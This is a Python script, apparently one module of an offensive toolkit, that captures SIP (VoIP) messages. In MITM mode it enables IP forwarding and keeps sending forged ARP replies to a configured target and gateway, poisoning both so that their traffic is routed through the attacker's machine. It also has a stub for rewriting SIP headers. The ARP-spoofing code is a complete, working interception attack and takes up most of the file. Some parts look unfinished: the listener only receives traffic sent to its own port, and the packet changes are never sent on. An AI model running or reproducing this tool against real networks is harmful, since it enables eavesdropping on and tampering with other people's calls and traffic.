#!/usr/bin/env python3

import socket
import threading
import time
import sys
import os
import subprocess
import termios
import tty
import select
from scapy.all import ARP, Ether, srp, send, getmacbyip, conf
from functions.func import get_local_ip, get_free_port, parse_message
from functions.config_parser import ConfigParser

class SipSniffer:
    def __init__(self):
        self.running = False
        self.local_ip = get_local_ip()
        self.local_port = get_free_port()
        self.target_ip = None
        self.gateway_ip = None
        self.interface = None
        self.mitm_mode = False
        self.thread_lock = threading.Lock()
        self.exit_event = threading.Event()
        
        # Load configuration
        self.load_config()

    def load_config(self):
        """Load configuration from the config file"""
        config_path = os.path.join(os.path.dirname(__file__), 'config', 'config.txt')
        try:
            config_parser = ConfigParser(config_path)
            config = config_parser.parse()
            
            self.target_ip = config.get('target_ip', '')
            self.gateway_ip = config.get('gateway_ip', '')
            self.interface = config.get('interface', '')
            self.mitm_mode = config_parser.get_bool('mitm_mode', False)
            
        except FileNotFoundError:
            print(f"Warning: Configuration file not found at {config_path}")
            print("Using default configuration values")
        except Exception as e:
            print(f"Error loading configuration: {e}")
            print("Using default configuration values")

    def get_key(self):
        """Get a single keypress from the terminal."""
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        try:
            tty.setraw(sys.stdin.fileno())
            if select.select([sys.stdin], [], [], 0.1)[0]:
                key = sys.stdin.read(1)
                return key
            return None
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)

    def check_for_space_stop(self):
        """Check if space bar was pressed to stop the scan"""
        key = self.get_key()
        if key == ' ':  # Space bar
            return True
        return False

    def enable_ip_forwarding(self):
        """Enable IP forwarding on the system"""
        try:
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], 
                         capture_output=True, text=True)
            print("[*] IP forwarding enabled")
            return True
        except Exception as e:
            print(f"Error enabling IP forwarding: {e}")
            return False

    def disable_ip_forwarding(self):
        """Disable IP forwarding on the system"""
        try:
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], 
                         capture_output=True, text=True)
            print("[*] IP forwarding disabled")
        except Exception as e:
            print(f"Error disabling IP forwarding: {e}")

    def format_mac(self, mac):
        """Convert MAC address to standard format (colons)"""
        try:
            if not mac:
                return None
            
            # Remove any existing separators and convert to lowercase
            mac = mac.replace('-', '').replace(':', '').lower()
            
            # Check if the MAC address is valid (should be 12 hex characters)
            if not all(c in '0123456789abcdef' for c in mac) or len(mac) != 12:
                print(f"[-] Invalid MAC address format: {mac}")
                return None
            
            # Add colons every 2 characters
            return ':'.join(mac[i:i+2] for i in range(0, len(mac), 2))
        except Exception as e:
            print(f"[-] Error formatting MAC address: {e}")
            return None

    def get_interface_mac(self):
        """Get the MAC address of the specified interface"""
        try:
            if not self.interface:
                print("[-] No interface specified")
                return None
            
            # Get MAC using ifconfig
            result = subprocess.run(['ifconfig', self.interface], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'ether' in line:
                    # Extract MAC address more carefully
                    mac = line.split('ether')[1].strip().split()[0]
                    # Convert to standard format
                    mac = self.format_mac(mac)
                    if mac:
                        print(f"[+] Found interface MAC: {mac}")
                        return mac
            
            print("[-] Could not find interface MAC address")
            return None
        except Exception as e:
            print(f"[-] Error getting interface MAC: {e}")
            return None

    def get_mac(self, ip):
        """Get MAC address of an IP using ARP requests"""
        try:
            print(f"[*] Attempting to discover MAC for {ip}")
            
            # Get our interface MAC
            interface_mac = self.get_interface_mac()
            if not interface_mac:
                print("[-] Could not get interface MAC address")
                return None
            
            # First try to ping the target to ensure it's in the ARP table
            try:
                print(f"[*] Pinging {ip} to ensure it's in the ARP table")
                subprocess.run(['ping', '-c', '1', ip], capture_output=True)
            except Exception as e:
                print(f"[-] Ping failed: {e}")
            
            # Try multiple ARP requests with different timeouts
            for attempt in range(3):
                try:
                    print(f"\n[*] ARP attempt {attempt + 1}/3")
                    
                    # Create ARP request packet
                    arp_request = ARP(
                        op=1,                    # ARP Request
                        pdst=ip,                 # Target IP
                        hwdst="FF:FF:FF:FF:FF:FF",  # Broadcast MAC
                        hwsrc=interface_mac,     # Our MAC
                        psrc=get_local_ip(),     # Our IP
                        ptype=0x0800,           # IPv4
                        hwtype=0x0001           # Ethernet
                    )
                    
                    # Create Ethernet frame
                    ether = Ether(
                        dst="FF:FF:FF:FF:FF:FF",  # Broadcast MAC
                        src=interface_mac,        # Our MAC
                        type=0x0806              # ARP type
                    )
                    
                    # Combine the packets
                    packet = ether/arp_request
                    
                    print(f"[*] Sending ARP request to {ip}")
                    print(f"[*] Using source MAC: {interface_mac}")
                    print(f"[*] Using source IP: {get_local_ip()}")
                    print(f"[*] Using broadcast MAC: FF:FF:FF:FF:FF:FF")
                    print(f"[*] Packet details:")
                    print(f"    - Ethernet: {ether.summary()}")
                    print(f"    - ARP: {arp_request.summary()}")
                    
                    # Send packet and get response with verbose output
                    answered_list = srp(packet, timeout=2, verbose=1)[0]
                    
                    if answered_list:
                        # Get the response packet
                        response = answered_list[0][1]
                        mac = response.hwsrc
                        # Convert to standard format
                        mac = self.format_mac(mac)
                        if mac:
                            print(f"[+] Received ARP response from {ip}")
                            print(f"[+] Source MAC: {mac}")
                            print(f"[+] Source IP: {response.psrc}")
                            return mac
                    else:
                        print(f"[-] No ARP response received on attempt {attempt + 1}")
                        
                except Exception as e:
                    print(f"[-] Error in ARP attempt {attempt + 1}: {e}")
                
                # Wait a bit between attempts
                time.sleep(1)
            
            # If all ARP attempts failed, try to get MAC from ARP table
            print("\n[*] All ARP attempts failed, checking ARP table...")
            try:
                result = subprocess.run(['arp', '-n'], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if ip in line:
                        mac = line.split()[2]
                        # Convert to standard format
                        mac = self.format_mac(mac)
                        if mac:
                            print(f"[+] Found MAC in ARP table: {mac}")
                            return mac
            except Exception as e:
                print(f"[-] Error checking ARP table: {e}")
            
            print(f"[-] Could not find MAC address for {ip} after all attempts")
            return None
                
        except Exception as e:
            print(f"[-] Error in get_mac: {e}")
            return None

    def start_arp_spoof(self):
        """Start ARP spoofing for MITM"""
        if not self.target_ip or not self.gateway_ip:
            print("Error: Target IP and Gateway IP must be set for MITM mode")
            return False

        try:
            print("\n[*] Starting MAC address discovery...")
            print(f"[*] Target IP: {self.target_ip}")
            print(f"[*] Gateway IP: {self.gateway_ip}")
            
            # Get our interface MAC
            interface_mac = self.get_interface_mac()
            if not interface_mac:
                print("[-] Could not get interface MAC address")
                return False
            
            # Get MAC addresses
            target_mac = self.get_mac(self.target_ip)
            if not target_mac:
                print(f"[-] Could not find MAC address for target {self.target_ip}")
                print("[*] Please verify the target IP is correct and reachable")
                return False
                
            gateway_mac = self.get_mac(self.gateway_ip)
            if not gateway_mac:
                print(f"[-] Could not find MAC address for gateway {self.gateway_ip}")
                print("[*] Please verify the gateway IP is correct and reachable")
                return False

            print(f"\n[+] Target MAC: {target_mac}")
            print(f"[+] Gateway MAC: {gateway_mac}")

            # Ensure MAC addresses are properly formatted
            target_mac = self.format_mac(target_mac)
            gateway_mac = self.format_mac(gateway_mac)
            interface_mac = self.format_mac(interface_mac)

            if not all([target_mac, gateway_mac, interface_mac]):
                print("[-] Error: Invalid MAC address format")
                return False

            # Create ARP packet for target
            target_arp = Ether(
                dst=target_mac,
                src=interface_mac
            )/ARP(
                op=2,  # ARP Reply
                pdst=self.target_ip,
                hwdst=target_mac,
                psrc=self.gateway_ip,
                hwsrc=interface_mac,
                ptype=0x0800,  # IPv4
                hwtype=0x0001  # Ethernet
            )

            # Create ARP packet for gateway
            gateway_arp = Ether(
                dst=gateway_mac,
                src=interface_mac
            )/ARP(
                op=2,  # ARP Reply
                pdst=self.gateway_ip,
                hwdst=gateway_mac,
                psrc=self.target_ip,
                hwsrc=interface_mac,
                ptype=0x0800,  # IPv4
                hwtype=0x0001  # Ethernet
            )

            print(f"\n[*] Starting ARP spoofing...")
            print(f"[*] Target: {self.target_ip} ({target_mac})")
            print(f"[*] Gateway: {self.gateway_ip} ({gateway_mac})")
            print(f"[*] Using interface MAC: {interface_mac}")

            # Enable IP forwarding
            if not self.enable_ip_forwarding():
                return False

            packet_count = 0
            while self.running:
                try:
                    # Send ARP packets
                    print(f"\n[*] Sending ARP packets (count: {packet_count})")
                    print(f"[*] Target packet: {target_arp.summary()}")
                    print(f"[*] Gateway packet: {gateway_arp.summary()}")
                    
                    send(target_arp, verbose=1)
                    send(gateway_arp, verbose=1)
                    
                    packet_count += 1
                    time.sleep(2)
                except Exception as e:
                    print(f"[-] Error in ARP spoofing: {e}")
                    break

        except Exception as e:
            print(f"[-] Error setting up ARP spoofing: {e}")
            return False
        finally:
            # Disable IP forwarding when done
            self.disable_ip_forwarding()

        return True

    def start(self):
        self.running = True
        self.exit_event.clear()

        # Start ARP spoofing if in MITM mode
        if self.mitm_mode:
            arp_thread = threading.Thread(target=self.start_arp_spoof)
            arp_thread.daemon = True
            arp_thread.start()

        # Create UDP socket for SIP traffic
        self.server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.server.bind((self.local_ip, self.local_port))
        print(f"[*] SIP Sniffer listening on {self.local_ip}:{self.local_port}")
        
        # Start packet handling in a separate thread
        sniff_thread = threading.Thread(target=self.sniff_packets)
        sniff_thread.daemon = True
        sniff_thread.start()

        # Monitor for stop command
        while self.running:
            if self.check_for_space_stop():
                print("\n[*] Stopping sniffer...")
                self.stop()
                break
            time.sleep(0.1)

    def sniff_packets(self):
        """Handle packet sniffing in a separate thread"""
        while self.running:
            try:
                data, addr = self.server.recvfrom(4096)
                self.handle_packet(data, addr)
            except Exception as e:
                if self.running:
                    print(f"Error: {e}")
                break

    def handle_packet(self, data, addr):
        try:
            message = data.decode('utf-8')
            parsed = parse_message(message)
            
            # Print packet information
            print(f"\n[*] SIP Packet from {addr[0]}:{addr[1]}")
            print(f"Method: {parsed['method']}")
            
            # Print headers in a more readable format
            print("\nHeaders:")
            for header, value in parsed['headers'].items():
                print(f"  {header}: {value}")
            
            if parsed['body']:
                print("\nBody:")
                print(parsed['body'])
            
            print("-" * 50)

            # If in MITM mode, you can modify packets here
            if self.mitm_mode:
                self.modify_packet(parsed, addr)

        except Exception as e:
            print(f"Error handling packet: {e}")

    def modify_packet(self, parsed, addr):
        """Modify packets in MITM mode"""
        # Example: Modify User-Agent header
        if 'User-Agent' in parsed['headers']:
            parsed['headers']['User-Agent'] = 'MITM-Modified'
            # You can add more modifications here

    def stop(self):
        """Stop the sniffer and clean up"""
        self.running = False
        self.exit_event.set()
        try:
            self.server.close()
        except:
            pass
        # Disable IP forwarding when stopping
        self.disable_ip_forwarding()

def main():
    """Main function to run the SIP sniffer"""
    print("\n=== SIP Sniffer Module ===")
    print("-------------------------")
    print("Press Space to stop sniffing")
    print("-------------------------")
    
    sniffer = SipSniffer()
    try:
        sniffer.start()
    except KeyboardInterrupt:
        print("\n[*] Stopping sniffer...")
        sniffer.stop()
    except Exception as e:
        print(f"\nError during sniffing: {str(e)}")
        sniffer.stop()
    
    input("\nPress Enter to return to main menu...")

if __name__ == "__main__":
    main()